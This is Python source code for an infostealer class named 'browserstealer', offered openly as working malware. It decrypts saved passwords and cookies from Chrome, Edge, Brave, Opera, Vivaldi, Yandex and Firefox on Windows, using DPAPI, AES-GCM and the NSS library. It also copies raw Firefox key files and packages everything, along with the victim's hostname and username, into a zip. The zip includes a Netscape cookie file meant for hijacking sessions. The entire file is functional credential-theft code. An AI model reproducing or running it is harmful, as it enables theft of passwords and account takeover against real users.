import os
import json
import base64
import sqlite3
import shutil
import zipfile
import ctypes
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    ca = True
except ImportError:
    ca = False


class browserstealer:
    class _si(ctypes.Structure):
        _fields_ = [("type", ctypes.c_uint), ("data", ctypes.c_char_p), ("len", ctypes.c_uint)]

    def __init__(s, op=None):
        s.op = op or os.path.join(
            tempfile.gettempdir(),
            f"browser_steal_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        )
        s.td = Path(tempfile.mkdtemp())
        s.pw = []
        s.ck = []
        s.md = {
            "timestamp": datetime.now().isoformat(),
            "hostname": os.environ.get("COMPUTERNAME", "unknown"),
            "username": os.environ.get("USERNAME", "unknown"),
            "browsers_found": [],
            "app_bound_detected": [],
            "errors": []
        }
        s.cb = [
            ("Chrome", r"Google\Chrome\User Data"),
            ("Edge", r"Microsoft\Edge\User Data"),
            ("Brave", r"BraveSoftware\Brave-Browser\User Data"),
            ("Opera", r"Opera Software\Opera Stable"),
            ("OperaGX", r"Opera Software\Opera GX Stable"),
            ("Vivaldi", r"Vivaldi\User Data"),
            ("Yandex", r"Yandex\YandexBrowser\User Data"),
        ]

    # public api
    def run(s):
        # execute full extraction and package to zip
        # returns path to generated zip file
        if not ca:
            s.md["errors"].append("cryptography library missing install pip install cryptography")
            return s._pkg()
        s._sc()
        s._sf()
        return s._pkg()

    def extract_only(s):
        # run extraction without packaging
        # returns passwords cookies metadata
        if ca:
            s._sc()
            s._sf()
        return s.pw, s.ck, s.md

    def get_passwords(s):
        return s.pw

    def get_cookies(s):
        return s.ck

    # crypto utilities
    def _dpd(s, ed):
        # decrypt a dpapi blob via ctypes no pywin32 dependency
        class db(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.c_void_p)]
        bi = db(len(ed), ctypes.cast(ed, ctypes.c_void_p))
        bo = db()
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)
        ):
            pt = ctypes.string_at(bo.pbData, bo.cbData)
            ctypes.windll.kernel32.LocalFree(bo.pbData)
            return pt
        return None

    def _gcmk(s, lsp):
        # extract and dpapi decrypt the chromium master key
        try:
            with open(lsp, "r", encoding="utf-8") as f:
                ls = json.load(f)
            ek = base64.b64decode(ls["os_crypt"]["encrypted_key"])
            ek = ek[5:]
            return s._dpd(ek)
        except Exception as e:
            s.md["errors"].append(f"master key fail {lsp} {e}")
            return None

    def _dcv(s, k, ev):
        # decrypt chromium aes gcm encrypted value
        # returns none if app bound v11 or unhandled format
        if not ev:
            return None
        pr = ev[:3]
        if pr == b'v10':
            ev = ev[3:]
        elif pr == b'v11':
            return None
        if len(ev) < 28:
            return None
        nc = ev[:12]
        ct = ev[12:]
        try:
            ag = AESGCM(k)
            pt = ag.decrypt(nc, ct, None)
            return pt.decode('utf-8', errors='ignore')
        except Exception:
            return None

    # chromium family
    def _sc(s):
        # enumerate and extract from all chromium based browsers
        la = os.environ.get("LOCALAPPDATA", "")
        for bn, rp in s.cb:
            udp = os.path.join(la, rp)
            if not os.path.exists(udp):
                continue
            s.md["browsers_found"].append(bn)
            ls = os.path.join(udp, "Local State")
            if not os.path.exists(ls):
                continue
            mk = s._gcmk(ls)
            if not mk:
                continue
            pr = ["Default"]
            try:
                for it in os.listdir(udp):
                    if it.startswith("Profile "):
                        pr.append(it)
            except Exception:
                pass
            for p in pr:
                pp = os.path.join(udp, p)
                if not os.path.exists(pp):
                    continue
                ldb = os.path.join(pp, "Login Data")
                cdb = os.path.join(pp, "Network", "Cookies")
                if os.path.exists(ldb):
                    s._ecp(ldb, mk, bn, p)
                if os.path.exists(cdb):
                    s._ecc(cdb, mk, bn, p)

    def _ecp(s, dp, k, b, p):
        # dump passwords from chromium login data
        tdb = s.td / f"{b}_{p}_login.db"
        try:
            shutil.copy2(dp, tdb)
        except Exception as e:
            s.md["errors"].append(f"copy fail {dp} {e}")
            return
        try:
            c = sqlite3.connect(str(tdb))
            cr = c.cursor()
            cr.execute("SELECT origin_url, username_value, password_value, date_created, times_used FROM logins")
            for r in cr.fetchall():
                u, un, ep, dc, tu = r
                if not ep:
                    continue
                ps = s._dcv(k, ep)
                if ps is None and ep[:3] == b'v11':
                    s.md["app_bound_detected"].append(f"{b}/{p}")
                    continue
                if ps:
                    s.pw.append({
                        "browser": b,
                        "profile": p,
                        "url": u,
                        "username": un,
                        "password": ps,
                        "date_created": dc,
                        "times_used": tu
                    })
            c.close()
        except Exception as e:
            s.md["errors"].append(f"password extraction {b}/{p} {e}")
        finally:
            if tdb.exists():
                tdb.unlink()

    def _ecc(s, dp, k, b, p):
        # dump cookies from chromium cookies db
        tdb = s.td / f"{b}_{p}_cookies.db"
        try:
            shutil.copy2(dp, tdb)
        except Exception as e:
            s.md["errors"].append(f"copy fail {dp} {e}")
            return
        try:
            c = sqlite3.connect(str(tdb))
            cr = c.cursor()
            cr.execute("SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, same_site FROM cookies")
            for r in cr.fetchall():
                h, n, v, ev, pt, eu, isec, iht, ss = r
                cv = v
                if not cv and ev:
                    d = s._dcv(k, ev)
                    if d is None and ev[:3] == b'v11':
                        s.md["app_bound_detected"].append(f"{b}/{p}")
                        continue
                    cv = d or ""
                if cv:
                    s.ck.append({
                        "browser": b,
                        "profile": p,
                        "host": h,
                        "name": n,
                        "value": cv,
                        "path": pt,
                        "expires_utc": eu,
                        "is_secure": bool(isec),
                        "is_httponly": bool(iht),
                        "same_site": ss
                    })
            c.close()
        except Exception as e:
            s.md["errors"].append(f"cookie extraction {b}/{p} {e}")
        finally:
            if tdb.exists():
                tdb.unlink()

    # firefox
    def _ffi(s):
        # locate firefox directory containing nss3 dll
        cd = [
            os.path.join(os.environ.get("PROGRAMFILES", r"C:\Program Files"), "Mozilla Firefox"),
            os.path.join(os.environ.get("PROGRAMFILES(X86)", r"C:\Program Files (x86)"), "Mozilla Firefox"),
        ]
        for pt in cd:
            if os.path.exists(os.path.join(pt, "nss3.dll")):
                return pt
        return None

    def _sf(s):
        # extract firefox credentials via nss ctypes
        ad = os.environ.get("APPDATA", "")
        pr = os.path.join(ad, r"Mozilla\Firefox\Profiles")
        if not os.path.exists(pr):
            return
        s.md["browsers_found"].append("Firefox")
        fi = s._ffi()
        if not fi:
            s._cfr(pr)
            s.md["errors"].append("firefox install not found copied raw dbs")
            return
        np = os.path.join(fi, "nss3.dll")
        for pn in os.listdir(pr):
            pp = os.path.join(pr, pn)
            if not os.path.isdir(pp):
                continue
            lj = os.path.join(pp, "logins.json")
            if not os.path.exists(lj):
                continue
            try:
                s._efl(np, pp, lj, pn)
                s._efc(pp, pn)
            except Exception as e:
                s.md["errors"].append(f"firefox {pn} {e}")

    def _efl(s, np, pp, lj, pn):
        # decrypt firefox logins json using nss pk11sdr decrypt
        nss = ctypes.CDLL(np)
        if nss.NSS_Init(pp.encode('utf-8')) != 0:
            raise Exception("nss init failed")
        try:
            pk = nss.PK11SDR_Decrypt
            pk.argtypes = [ctypes.POINTER(s._si), ctypes.POINTER(s._si), ctypes.c_void_p]
            pk.restype = ctypes.c_int
            with open(lj, "r", encoding="utf-8") as f:
                d = json.load(f)
            for e in d.get("logins", []):
                hn = e.get("hostname", "")
                eu = e.get("encryptedUsername", "")
                ep = e.get("encryptedPassword", "")
                un = s._dfv(nss, pk, eu) if eu else ""
                ps = s._dfv(nss, pk, ep) if ep else ""
                if ps:
                    s.pw.append({
                        "browser": "Firefox",
                        "profile": pn,
                        "url": hn,
                        "username": un,
                        "password": ps,
                        "date_created": e.get("timeCreated"),
                        "times_used": e.get("timesUsed")
                    })
        finally:
            nss.NSS_Shutdown()

    def _dfv(s, nss, pk, bd):
        # single value nss decrypt
        rw = base64.b64decode(bd)
        i = s._si(0, ctypes.c_char_p(rw), len(rw))
        o = s._si()
        if pk(ctypes.byref(i), ctypes.byref(o), None) == 0:
            if o.data and o.len:
                rs = ctypes.string_at(o.data, o.len).decode('utf-8', errors='ignore')
                nss.NSS_Free(o.data)
                return rs
        return ""

    def _efc(s, pp, pn):
        # extract firefox cookies sqlite plaintext values
        cs = os.path.join(pp, "cookies.sqlite")
        if not os.path.exists(cs):
            return
        tdb = s.td / f"firefox_{pn}_cookies.db"
        try:
            shutil.copy2(cs, tdb)
            c = sqlite3.connect(str(tdb))
            cr = c.cursor()
            cr.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
            for r in cr.fetchall():
                h, n, v, pt, ex, isec, iht = r
                s.ck.append({
                    "browser": "Firefox",
                    "profile": pn,
                    "host": h,
                    "name": n,
                    "value": v,
                    "path": pt,
                    "expires_utc": ex,
                    "is_secure": bool(isec),
                    "is_httponly": bool(iht)
                })
            c.close()
        except Exception as e:
            s.md["errors"].append(f"firefox cookies {pn} {e}")
        finally:
            if tdb.exists():
                tdb.unlink()

    def _cfr(s, pr):
        # backup raw firefox files when nss is unavailable
        for pn in os.listdir(pr):
            pp = os.path.join(pr, pn)
            if not os.path.isdir(pp):
                continue
            for fn in ["logins.json", "key4.db", "cookies.sqlite", "places.sqlite"]:
                src = os.path.join(pp, fn)
                if os.path.exists(src):
                    try:
                        shutil.copy2(src, s.td / f"firefox_{pn}_{fn}")
                    except Exception:
                        pass

    # packaging
    def _wnc(s, fp):
        # generate cookies txt in netscape format for tool ingestion
        with open(fp, "w", encoding="utf-8") as f:
            f.write("# netscape http cookie file\n")
            for ck in s.ck:
                d = ck["host"]
                dt = "true" if d.startswith(".") else "false"
                pt = ck.get("path", "/")
                sc = "true" if ck.get("is_secure") else "false"
                ex = str(int(ck.get("expires_utc", 0)))
                n = ck["name"]
                v = ck["value"]
                f.write(f"{d}\t{dt}\t{pt}\t{sc}\t{ex}\t{n}\t{v}\n")

    def _pkg(s):
        # create zip with all extracted data
        pf = s.td / "passwords.json"
        cf = s.td / "cookies.json"
        mf = s.td / "metadata.json"
        nf = s.td / "cookies.txt"
        with open(pf, "w", encoding="utf-8") as f:
            json.dump(s.pw, f, indent=2, ensure_ascii=False)
        with open(cf, "w", encoding="utf-8") as f:
            json.dump(s.ck, f, indent=2, ensure_ascii=False)
        with open(mf, "w", encoding="utf-8") as f:
            json.dump(s.md, f, indent=2, ensure_ascii=False)
        if s.ck:
            s._wnc(nf)
        with zipfile.ZipFile(s.op, 'w', zipfile.ZIP_DEFLATED) as z:
            z.write(pf, "passwords.json")
            z.write(cf, "cookies.json")
            z.write(mf, "metadata.json")
            if nf.exists():
                z.write(nf, "cookies.txt")
            for it in s.td.iterdir():
                if it.is_file() and it.name not in [
                    "passwords.json", "cookies.json", "metadata.json", "cookies.txt"
                ]:
                    z.write(it, f"raw/{it.name}")
        try:
            shutil.rmtree(s.td)
        except Exception:
            pass
        return s.op


# convenience api
def steal_to_zip(op=None):
    # one shot extraction
    # args output path destination zip path defaults to temp directory
    # returns path to created zip file
    s = browserstealer(op)
    return s.run()


if __name__ == "__main__":
    s = browserstealer()
    o = s.run()
    print(f"[+] extracted data saved to {o}")
    print(f"[+] passwords {len(s.pw)}")
    print(f"[+] cookies {len(s.ck)}")
    if s.md["app_bound_detected"]:
        print(f"[!] app bound detected on {s.md['app_bound_detected']}")
